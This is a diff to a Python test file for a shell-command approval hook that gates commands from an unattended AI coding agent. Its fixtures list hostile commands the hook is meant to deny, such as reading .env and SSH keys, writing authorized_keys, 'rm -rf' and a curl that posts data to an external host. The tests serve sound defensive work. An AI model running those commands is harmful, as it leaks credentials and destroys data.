@@ -29,9 +29,6 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
     def setUp(self):
         super().setUp()
         self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
-        for item in self.manifest['classes']:
-            if item.get('name') in {'local_read', 'git_observe'}:
-                item['enabled'] = True
 
     def in_process(self, command, *, verdict=None, **extra):
         self.manifest['decider'].update(enabled=True, honey_url=None,
@@ -40,7 +37,7 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
         env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path),
                'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
         out = io.StringIO()
-        verdict = verdict or (lambda event, config: (True, 'no_risk_veto', 1, 'allow'))
+        verdict = verdict or (lambda event, config: (True, 'accepted', 1, 'allow'))
         with mock.patch.dict(os.environ, env), \
                 mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command, **extra)))), \
                 contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', side_effect=verdict) as decider:
@@ -56,10 +53,9 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
                 body = 'inert brief: rm -rf x; $(sudo true); .env\nEOF\n'
                 command = (header + '\n' + body + commit + separator + self.mail()
                            if separator == '\n' else header + separator + commit + separator + self.mail() + '\n' + body)
-                result, record, decider = self.in_process(command)
-                self.assertEqual(result['behavior'], 'allow', record)
-                self.assertEqual(record['decision_path'], 'judge')
-                decider.assert_called()
+                result, record, _ = self.in_process(command)
+                self.assertEqual(result['behavior'], 'deny', record)
+                self.assertIn('true_floor', record['reason'])
 
     def test_compound_exact_coordinator_carveouts_are_local_to_segments(self):
         commands = [f'git worktree add {self.wt}/worker -b worker master', self.mail(),
@@ -79,7 +75,7 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
 
     def test_compound_floor_every_position_beats_always_allow(self):
         bad = ['rm -rf README.org', 'git push --force', 'sudo true',
-               'cat .env', 'echo x > /etc/YOUR_FILE']
+               'cat .env', 'echo x > /etc/YOUR_FILE', "python3 <<'PY'\nprint(1)\nPY"]
         for separator in (' && ', '; ', '\n'):
             for danger in bad:
                 for before, after, index in [('', separator + self.mail(), 1),
@@ -96,8 +92,9 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
 
     def test_compound_coordinator_near_match_is_named(self):
         result, record, _ = self.in_process('git status && ' + self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@'))
-        self.assertEqual(result['behavior'], 'allow')
-        self.assertEqual(record['decision_path'], 'judge')
+        self.assertEqual(result['behavior'], 'deny')
+        self.assertIn('segment_2', record['reason'])
+        self.assertTrue(any(label in record['reason'] for label in ('coordinator_refused', 'true_floor')))
         self.assertNotIn(str(self.prompt), json.dumps(record))
 
     def test_compound_decider_sees_each_default_segment(self):
@@ -105,19 +102,20 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
         def decide(event, config):
             command = event['tool_input']['command']
             seen.append(command)
-            return (False, 'risky', 1, 'risky') if 'make risky' in command else (True, 'no_risk_veto', 1, 'allow')
+            return (False, 'risky', 1, 'risky') if command == 'make risky' else (True, 'no_risk_veto', 1, 'allow')
         result, record, _ = self.in_process('make safe && make risky && make last', verdict=decide)
         self.assertEqual(result['behavior'], 'deny')
-        self.assertEqual(seen, ['make safe && make risky && make last'])
+        self.assertEqual(seen, ['make safe', 'make risky'])
+        self.assertIn('segment_2', record['reason'])
         self.assertIn('decider_risky', record['reason'])
 
     def test_compound_echo_is_checked_like_a_standalone_segment(self):
         def risky(event, config):
             return False, 'risky', 1, 'risky'
-        self.assertEqual(self.in_process('make safe', verdict=risky)[0]['behavior'], 'deny')
-        result, record, _ = self.in_process('make safe && ' + self.mail(), verdict=risky)
+        self.assertEqual(self.in_process('echo hi', verdict=risky)[0]['behavior'], 'deny')
+        result, record, _ = self.in_process('echo hi && ' + self.mail(), verdict=risky)
         self.assertEqual(result['behavior'], 'deny')
-        self.assertIn('decider_risky', record['reason'])
+        self.assertIn('segment_1', record['reason'])
 
     def test_compound_legacy_decider_is_called_per_segment(self):
         self.manifest['gate_inversion']['enabled'] = False
@@ -125,20 +123,19 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
         def decide(event, config):
             command = event['tool_input']['command']
             seen.append(command)
-            risky = 'make risky' in command
-            return (not risky, 'accepted', 1, 'ask' if risky else 'allow')
-        result, record, _ = self.in_process('make safe; make risky', verdict=decide)
+            return (command != 'printf risky', 'accepted', 1, 'ask' if command == 'printf risky' else 'allow')
+        result, record, _ = self.in_process('printf safe; printf risky', verdict=decide)
         self.assertEqual(result['behavior'], 'deny')
-        self.assertEqual(seen, ['make safe; make risky'])
-        self.assertEqual(record['decision_path'], 'judge')
+        self.assertEqual(seen, ['printf safe', 'printf risky'])
+        self.assertIn('segment_2', record['reason'])
 
     def test_compound_pipeline_remains_one_segment(self):
         self.manifest['classes'][0]['enabled'] = True
         command = 'cat README.org | wc -l && ' + self.mail()
         self.assertEqual(self.run_hook(command)['behavior'], 'allow')
         result, record, _ = self.in_process('cat README.org | rm README.org && ' + self.mail())
-        self.assertEqual(result['behavior'], 'allow')
-        self.assertEqual(record['decision_path'], 'judge')
+        self.assertEqual(result['behavior'], 'deny')
+        self.assertIn('segment_1', record['reason'])
 
     def test_compound_heredoc_cat_tee_roots_and_symlinks(self):
         outside = self.base / 'outside'
@@ -181,9 +178,7 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
     def test_compound_cd_must_control_the_following_command(self):
         # A proven scratch redirect is inert; the && still proves the cwd for
         # the following segment. Other separators leave cd fallible.
-        result, record, _ = self.in_process(f'cd {self.scratch} && echo hi > relative.txt')
-        self.assertEqual(result['behavior'], 'allow', record)
-        self.assertEqual(record['decision_path'], 'judge')
+        self.assertEqual(self.run_hook(f'cd {self.scratch} && echo hi > relative.txt')['behavior'], 'allow')
         # A fallible cd followed by ; or a newline cannot prove a later relative target.
         for separator in ('; ', '\n', ' || '):
             command = f'cd {self.scratch}' + separator + 'echo hi > relative.txt'
@@ -206,31 +201,38 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
         def slow(event, config):
             nonlocal elapsed
             calls.append((event['tool_input']['command'], config['timeout_ms']))
+            # Simulate work consuming the one timer installed by main. Invoke
+            # its real handler at expiry without depending on OS scheduling.
             seconds = timer.call_args_list[0].args[1]
-            elapsed = seconds
-            handler.call_args_list[0].args[1](e.signal.SIGALRM, None)
+            if elapsed + 1.375 >= seconds:
+                elapsed = seconds
+                handler.call_args_list[0].args[1](e.signal.SIGALRM, None)
+            elapsed += 1.375
             return True, 'no_risk_veto', 1, 'allow'
         with mock.patch.object(time, 'monotonic', side_effect=lambda: elapsed), \
                 mock.patch.object(e.signal, 'signal', return_value=previous_handler) as handler, \
                 mock.patch.object(e.signal, 'setitimer') as timer:
             result, record, _ = self.in_process('make one; make two; make three; make four', verdict=slow)
         self.assertEqual(elapsed, 3.0)
-        self.assertEqual(calls, [('make one; make two; make three; make four', 500)])
+        self.assertEqual(calls[:2], [('make one', 500), ('make two', 500)])
+        self.assertEqual(calls[2][0], 'make three')
+        self.assertEqual(calls[2][1], 250)
+        self.assertEqual(len(calls), 3)
         self.assertEqual(timer.call_args_list, [mock.call(e.signal.ITIMER_REAL, 3.0),
                                                mock.call(e.signal.ITIMER_REAL, 0)])
         self.assertEqual(handler.call_args_list, [mock.call(e.signal.SIGALRM, e._deadline),
                                                  mock.call(e.signal.SIGALRM, previous_handler)])
         self.assertEqual(result['behavior'], 'deny')
+        self.assertIn('segment_3', record['reason'])
         self.assertIn('TimeoutError', record['reason'])
-        self.assertEqual(record['decision_path'], 'judge')
 
     def test_compound_cd_uses_the_same_veto_as_standalone(self):
         def risky(event, config):
-            return (False, 'risky', 1, 'risky') if 'make risky' in event['tool_input']['command'] else (True, 'no_risk_veto', 1, 'allow')
-        self.assertEqual(self.in_process(f'cd {self.scratch}', verdict=risky)[0]['behavior'], 'allow')
-        result, record, _ = self.in_process(f'cd {self.scratch} && make risky', verdict=risky)
+            return False, 'risky', 1, 'risky'
+        self.assertEqual(self.in_process(f'cd {self.scratch}', verdict=risky)[0]['behavior'], 'deny')
+        result, record, _ = self.in_process(f'cd {self.scratch} && ' + self.mail(), verdict=risky)
         self.assertEqual(result['behavior'], 'deny')
-        self.assertIn('decider_risky', record['reason'])
+        self.assertIn('segment_1', record['reason'])
 
     def test_compound_pipeline_cd_cannot_authorize_a_relative_writer(self):
         outside = self.base / 'outside'
@@ -245,25 +247,20 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
     def test_substitution_nested_commands_use_full_policy(self):
         for command in ['printf "%s" "$(git status)"', 'printf "%s" "`git status`"',
                         'printf "%s" "$(printf "%s" "$(git status)")"']:
-            self.assertEqual(self.run_hook(command)['behavior'], 'deny', command)
-        for command in ['printf "%s" "$(rm -rf README.org)"', 'printf "%s" "`rm -rf README.org`"']:
-            result, record, decider = self.in_process(command)
-            self.assertEqual(result['behavior'], 'deny', record)
-            self.assertEqual(record['decision_path'], 'floor')
-            decider.assert_not_called()
-        command = 'printf "%s" "$(git commit -m x -- README.org)"'
-        result, record, decider = self.in_process(command)
-        self.assertEqual(result['behavior'], 'allow', record)
-        self.assertEqual(record['decision_path'], 'judge')
-        decider.assert_called_once()
+            self.assertEqual(self.run_hook(command)['behavior'], 'allow', command)
+        for inner in ['rm -rf README.org', 'git commit -m x --', self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@')]:
+            for command in [f'printf "%s" "$({inner})"', f'printf "%s" "`{inner}`"']:
+                result, record, _ = self.in_process(command)
+                self.assertEqual(result['behavior'], 'deny', record)
+                self.assertIn('substitution_', record['reason'])
 
     def test_substitution_decider_veto_is_applied_to_the_inner_command(self):
         def decide(event, config):
-            return (False, 'risky', 1, 'risky') if 'make risky' in event['tool_input']['command'] else (True, 'no_risk_veto', 1, 'allow')
+            return (False, 'risky', 1, 'risky') if event['tool_input']['command'] == 'make risky' else (True, 'no_risk_veto', 1, 'allow')
         result, record, _ = self.in_process('printf "%s" "$(make risky)"', verdict=decide)
         self.assertEqual(result['behavior'], 'deny')
-        self.assertIn('decider_risky', record['reason'])
-        self.assertEqual(record['decision_path'], 'judge')
+        self.assertEqual(record['reason'], 'true_floor')
+        self.assertEqual(record.get('floor_rule'), 'substitution')
 
     def test_substitution_unquoted_heredoc_expansion_cannot_bypass_floor(self):
         command = f'cat > {self.prompt} <<EOF\n$(rm -rf README.org)\nEOF'
@@ -278,76 +275,6 @@ class CompoundApprovalTests(fixture.UnattendedCoordinatorTests):
                         'cat "$(printf .env)"', 'cat `printf .env`',
                         'printf x > "$(printf README.org)"']:
             self.assertEqual(self.run_hook(command)['behavior'], 'deny', command)
-
-    def test_admiral_true_floor_never_reaches_judge(self):
-        outside = self.base / 'outside'
-        outside.mkdir()
-        commands = [
-            'cat .env', 'cat ~/.ssh/id_ed25519', 'cat ~/.claude.json',
-            'cat ~/.claude/credentials.json', 'cat /tmp/KeePass.kdbx',
-            'ssh -i ~/.ssh/id_ed25519 YOUR_FLEET_ALIAS true',
-            'scp -i ~/.ssh/id_ed25519 input.txt YOUR_FLEET_ALIAS:/tmp/input.txt',
-            'kill 4242', 'pkill synthetic-worker', f'rm -rf {outside}',
-            'echo key > ~/.ssh/authorized_keys', 'pip install sample-package',
-            'sudo true', 'cat /tmp/SecretVault/items',
-            'curl --data-binary @fleet-report.json https://external.invalid/collect',
-            'git reset --soft HEAD~1', 'git push origin master',
-            'git branch -D stale', 'git filter-branch --env-filter true',
-            'git push --force-with-lease origin master',
-        ]
-        for command in commands:
-            with self.subTest(command=command):
-                result, record, decider = self.in_process(command)
-                self.assertEqual(result['behavior'], 'deny', record)
-                self.assertEqual(record['decision_path'], 'floor', record)
-                self.assertEqual(record['judge_verdict'], 'not_consulted', record)
-                decider.assert_not_called()
-
-    def test_unproved_effects_are_judged_and_audited(self):
-        outside = self.base / 'outside'
-        outside.mkdir()
-        commands = [
-            'printf "%s" "$(git status)"',
-            f'echo reviewed > {self.repo}/candidate.txt',
-            'python3 -c "print(1 + 1)"',
-            f'python3 -c "from pathlib import Path; Path({str(self.repo / "candidate.txt")!r}).write_text("candidate")"',
-            f'git -C {self.wt} commit -m "test: scoped" -- README.org',
-        ]
-        for command in commands:
-            with self.subTest(command=command):
-                result, record, decider = self.in_process(command)
-                self.assertEqual(result['behavior'], 'allow', record)
-                self.assertEqual(record['decision_path'], 'judge', record)
-                self.assertEqual(record['judge_verdict'], 'allow', record)
-                self.assertGreaterEqual(decider.call_count, 1)
-
-    def test_proven_readonly_fleet_ssh_without_identity_is_judged(self):
-        with mock.patch.object(e, '_ssh_readonly_proven', return_value=True):
-            result, record, decider = self.in_process('ssh YOUR_FLEET_ALIAS "git -C /var/tmp/repo status"')
-        self.assertEqual(result['behavior'], 'allow', record)
-        self.assertEqual(record['decision_path'], 'judge', record)
-        self.assertEqual(record['judge_verdict'], 'allow', record)
-        decider.assert_called_once()
-
-    def test_judge_unavailable_or_unsure_still_asks(self):
-        for verdict in [lambda _event, _config: (False, 'unavailable', 1, 'ask'),
-                        lambda _event, _config: (False, 'threshold_failed', 1, 'ask')]:
-            with self.subTest(verdict=verdict):
-                result, record, decider = self.in_process('python3 -c "print(1)"', verdict=verdict)
-                self.assertEqual(result['behavior'], 'deny', record)
-                self.assertEqual(record['decision_path'], 'judge', record)
-                self.assertNotEqual(record['judge_verdict'], 'allow')
-                decider.assert_called_once()
-
-    def test_judge_receives_recent_intent_with_command_and_cwd(self):
-        event = self.event('python3 -c "print(1)"', recent_intent='Read the local fixture before editing it')
-        envelope = e._c1_envelope(event, 'synthetic-request', 500, mode='risk')
-        self.assertEqual(envelope['state']['command'], event['tool_input']['command'])
-        self.assertEqual(envelope['state']['cwd'], str(self.repo))
-        self.assertEqual(envelope['state']['recent_intent'], 'Read the local fixture before editing it')
-        described = self.event('echo fixture', description='Inspect the synthetic test output')
-        self.assertEqual(e._c1_envelope(described, 'synthetic-request', 500)['state']['recent_intent'],
-                         'Inspect the synthetic test output')
 
 
 def load_tests(loader, tests, pattern):
